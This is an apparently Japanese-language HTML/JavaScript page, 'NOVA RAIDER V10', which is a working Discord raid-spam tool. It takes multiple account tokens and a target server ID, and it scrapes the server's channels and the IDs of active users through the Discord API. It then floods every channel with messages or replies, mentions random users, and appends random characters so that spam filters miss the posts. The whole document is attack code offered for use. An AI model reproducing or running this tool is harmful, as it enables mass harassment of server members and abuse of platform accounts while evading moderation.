<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>NOVA RAIDER - Zero Delay</title>
    <style>
        :root {
            --bg: #040406;
            --accent: #00d4ff;
            --danger: #ff0055;
            --card: #0d0d16;
            --border: #1a1a2e;
            --success: #00ff88;
        }

        body {
            font-family: 'Consolas', 'Meiryo', sans-serif;
            background-color: var(--bg);
            color: #d1d1d6;
            margin: 0; padding: 20px; display: flex; justify-content: center;
        }

        .container {
            width: 100%; max-width: 850px; background: var(--card); padding: 25px;
            border-radius: 8px; border: 1px solid var(--border);
            box-shadow: 0 0 40px rgba(0, 212, 255, 0.1);
        }

        .title-area { text-align: center; margin-bottom: 20px; border-bottom: 2px solid var(--accent); padding-bottom: 10px; }
        .title { font-size: 24px; font-weight: 900; letter-spacing: 8px; color: var(--accent); margin: 0; }

        label { display: block; font-size: 11px; color: var(--accent); margin-bottom: 5px; font-weight: bold; }

        textarea, input, select {
            width: 100%; padding: 12px; background: #000; border: 1px solid var(--border);
            border-radius: 4px; color: #fff; box-sizing: border-box; font-size: 12px; outline: none;
        }

        .flex-row { display: flex; gap: 10px; margin-bottom: 15px; }
        .flex-1 { flex: 1; }

        .btn { padding: 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; transition: 0.2s; font-size: 13px; }
        .btn-main { background: var(--accent); color: #000; width: 100%; }
        .btn-stop { background: var(--danger); color: #fff; width: 100px; }

        .mode-panel {
            background: #000; padding: 10px; border-radius: 4px; border: 1px solid var(--border);
            display: flex; gap: 10px; margin-bottom: 15px;
        }
        .mode-btn { flex: 1; padding: 10px; background: #111; color: #555; border: 1px solid #333; text-align: center; cursor: pointer; font-size: 12px; border-radius: 4px; }
        .mode-btn.active { border-color: var(--accent); color: var(--accent); background: rgba(0, 212, 255, 0.1); }

        .delay-control {
            background: rgba(255, 0, 85, 0.1); padding: 15px; border-radius: 4px; border: 1px solid var(--danger); margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(255, 0, 85, 0.2);
        }

        .status-bar {
            display: flex; justify-content: space-between; background: #000; padding: 12px;
            border-radius: 4px; margin-bottom: 15px; border: 1px solid var(--border); font-size: 13px;
        }
        .status-val { color: var(--accent); font-weight: bold; }

        #log { margin-top: 15px; height: 150px; background: #000; border: 1px solid var(--border); padding: 10px; font-size: 11px; overflow-y: auto; color: #666; }
        
        /* メンションスイッチ */
        .toggle-container { display: flex; align-items: center; gap: 10px; margin-bottom: 15px; background: #1a1a2a; padding: 10px; border-radius: 4px; }
        .switch { position: relative; display: inline-block; width: 40px; height: 20px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .4s; border-radius: 20px; }
        .slider:before { position: absolute; content: ""; height: 14px; width: 14px; left: 3px; bottom: 3px; background-color: white; transition: .4s; border-radius: 50%; }
        input:checked + .slider { background-color: var(--accent); }
        input:checked + .slider:before { transform: translateX(20px); }
    </style>
</head>
<body>

<div class="container">
    <div class="title-area">
        <h1 class="title">NOVA RAIDER V10</h1>
    </div>

    <div class="form-section" style="margin-bottom: 15px;">
        <label>使用トークン (1行1枚)</label>
        <textarea id="tokens" style="height: 50px;" placeholder="トークンを入力..."></textarea>
    </div>

    <div class="flex-row">
        <div class="flex-1">
            <label>ターゲットサーバーID</label>
            <input type="text" id="guildId">
            <button class="btn" style="background:#1a1a2a; color:var(--accent); font-size:10px; margin-top:5px; padding:5px; width:100%;" onclick="fetchServerInfo()">サーバー情報を取得</button>
        </div>
        <div style="width: 140px;">
            <label>遡り/送信数</label>
            <input type="number" id="limit" value="15">
        </div>
    </div>

    <div class="delay-control">
        <label style="color: var(--danger); letter-spacing: 2px;">送信間隔 (秒) - 最小 0.01</label>
        <div style="display: flex; align-items: center; gap: 10px;">
            <input type="number" id="delayNum" value="0.5" step="0.01" min="0.01" 
                   style="width: 100%; text-align: center; color: var(--danger); font-weight: bold; font-size: 16px;">
            <span style="font-size: 14px; color: var(--danger); font-weight: bold;">秒</span>
        </div>
    </div>

    <div class="flex-row">
        <div class="flex-1">
            <label>チャンネルIDリスト</label>
            <textarea id="channels" style="height: 60px;" placeholder="取得されたチャンネル"></textarea>
        </div>
        <div class="flex-1">
            <label>アクティブユーザーIDリスト (自動抽出)</label>
            <textarea id="members" style="height: 60px;" placeholder="発言履歴のあるユーザー"></textarea>
        </div>
    </div>

    <div class="toggle-container">
        <span style="font-size: 12px; color: var(--accent); font-weight: bold;">ランダムメンション</span>
        <label class="switch">
            <input type="checkbox" id="mentionToggle" checked>
            <span class="slider"></span>
        </label>
    </div>

    <label>攻撃モード</label>
    <div class="mode-panel">
        <div id="modeNormal" class="mode-btn active" onclick="setMode('normal')">通常爆撃</div>
        <div id="modeReply" class="mode-btn" onclick="setMode('reply')">既存メッセージへリプライ</div>
    </div>

    <div class="flex-row" style="align-items: flex-end;">
        <div class="flex-1">
            <label>送信メッセージ</label>
            <input type="text" id="msgBody" placeholder="メッセージ内容">
        </div>
        <div style="width: 160px;">
            <label>ランダム回避言語</label>
            <select id="lang">
                <option value="en">英語</option>
                <option value="en_num">英数字</option>
                <option value="jp_kana">日本語 (かな)</option>
                <option value="jp_kanji">日本語 (漢字)</option>
                <option value="ko">韓国語</option>
                <option value="km" selected>クメール語</option>
                <option value="ar">アラビア語</option>
                <option value="zh">中国語</option>
            </select>
        </div>
    </div>

    <div class="status-bar">
        <div>MODE: <span id="currentModeDisplay" class="status-val">NORMAL</span></div>
        <div>SENT: <span id="sentCount" class="status-val">0</span></div>
        <div>STATUS: <span id="statusText" class="status-val">READY</span></div>
    </div>

    <div class="flex-row">
        <button id="start" class="btn btn-main flex-1" onclick="execute()">スパムを開始</button>
        <button id="stop" class="btn btn-stop" onclick="stop()" disabled>停止</button>
    </div>

    <div id="log"></div>
</div>

<script>
    let sweeping = false;
    let attackMode = 'normal';
    let sentCount = 0;

    const charSets = {
        en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        en_num: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        jp_kana: "あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをん",
        jp_kanji: "一二三四五六七八九十百千万電撃戦術爆撃殲滅壊滅地獄闇魔法",
        ko: "가나다라마바사아자차카타파하",
        km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ",
        ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي",
        zh: "天地玄黄宇宙洪荒日月盈昃辰宿列张"
    };

    function log(m) {
        const l = document.getElementById('log');
        const d = document.createElement('div');
        d.innerHTML = `[${new Date().toLocaleTimeString()}] ${m}`;
        l.prepend(d);
    }

    function setMode(mode) {
        attackMode = mode;
        document.getElementById('modeNormal').classList.toggle('active', mode === 'normal');
        document.getElementById('modeReply').classList.toggle('active', mode === 'reply');
        document.getElementById('currentModeDisplay').innerText = mode.toUpperCase();
    }

    async function fetchServerInfo() {
        const t = document.getElementById('tokens').value.split('\n')[0].trim();
        const g = document.getElementById('guildId').value.trim();
        const limit = parseInt(document.getElementById('limit').value) || 50;

        if(!t || !g) return alert("情報を取得するにはトークン1枚とサーバーIDが必要です");

        try {
            log("サーバー情報取得中...");
            const rC = await fetch(`https://discord.com/api/v9/guilds/${g}/channels`, { headers: { 'Authorization': t } });
            const channels = await rC.json();
            const textChannels = channels.filter(c => [0,5].includes(c.type));
            document.getElementById('channels').value = textChannels.map(c => c.id).join('\n');

            let userSet = new Set();
            log(`${textChannels.length}個のチャンネルから発言ユーザーを抽出中...`);

            // 各チャンネルの最新メッセージからユーザーIDを取得
            for(const ch of textChannels.slice(0, 10)) { // 負荷軽減のため上位10件のチャンネルを優先調査
                const rM = await fetch(`https://discord.com/api/v9/channels/${ch.id}/messages?limit=${limit}`, { headers: { 'Authorization': t } });
                const msgs = await rM.json();
                if(Array.isArray(msgs)) {
                    msgs.forEach(m => userSet.add(m.author.id));
                }
            }

            document.getElementById('members').value = Array.from(userSet).join('\n');
            log(`取得完了: ${textChannels.length}件のチャンネル, ${userSet.size}名の発言者`);
        } catch(e) { 
            log("取得失敗。トークンや権限を確認してください。"); 
        }
    }

    function getRand() {
        const s = charSets[document.getElementById('lang').value];
        let r = "";
        for(let i=0; i<15; i++) r += s.charAt(Math.floor(Math.random()*s.length));
        return r;
    }

    async function execute() {
        const msg = document.getElementById('msgBody').value.trim();
        if (!msg) return alert("メッセージを入力してください。");

        sweeping = true;
        document.getElementById('start').disabled = true;
        document.getElementById('stop').disabled = false;
        document.getElementById('statusText').innerText = "RUNNING";
        
        const tokens = document.getElementById('tokens').value.split('\n').filter(x => x.trim());
        const channels = document.getElementById('channels').value.split('\n').filter(x => x.trim());
        const members = document.getElementById('members').value.split('\n').filter(x => x.trim());
        const limit = parseInt(document.getElementById('limit').value);
        const isMention = document.getElementById('mentionToggle').checked;
        
        let delaySec = parseFloat(document.getElementById('delayNum').value);
        if (delaySec < 0.01) delaySec = 0.01;
        const delayMs = delaySec * 1000;

        log("スパム開始");

        for (const chId of channels) {
            if (!sweeping) break;
            if (attackMode === 'reply') {
                try {
                    const res = await fetch(`https://discord.com/api/v9/channels/${chId}/messages?limit=${limit}`, {
                        headers: { 'Authorization': tokens[0] }
                    });
                    const msgs = await res.json();
                    if (Array.isArray(msgs)) {
                        for (const m of msgs) {
                            if (!sweeping) break;
                            await sendMsg(tokens, chId, m.id, members, msg, isMention);
                            await new Promise(r => setTimeout(r, delayMs));
                        }
                    }
                } catch (e) {}
            } else {
                for (let i = 0; i < limit; i++) {
                    if (!sweeping) break;
                    await sendMsg(tokens, chId, null, members, msg, isMention);
                    await new Promise(r => setTimeout(r, delayMs));
                }
            }
        }
        stop();
    }

    async function sendMsg(tokens, chId, replyId, members, msg, isMention) {
        const token = tokens[Math.floor(Math.random() * tokens.length)];
        
        let content = msg;
        if (isMention && members.length > 0) {
            const randomUser = members[Math.floor(Math.random() * members.length)];
            content = `<@${randomUser}> ${msg}`;
        }

        const payload = { content: `${content}\n# ${getRand()}` };
        
        if (replyId) {
            payload.message_reference = { message_id: replyId };
            payload.allowed_mentions = { replied_user: true };
        }

        try {
            fetch(`https://discord.com/api/v9/channels/${chId}/messages`, {
                method: 'POST',
                headers: { 'Authorization': token, 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).then(res => {
                if (res.ok) {
                    sentCount++;
                    document.getElementById('sentCount').innerText = sentCount;
                }
            });
        } catch (e) {}
    }

    function stop() {
        sweeping = false;
        document.getElementById('start').disabled = false;
        document.getElementById('stop').disabled = true;
        document.getElementById('statusText').innerText = "STOPPED";
        log("終了しました。");
    }
</script>
</body>
</html>
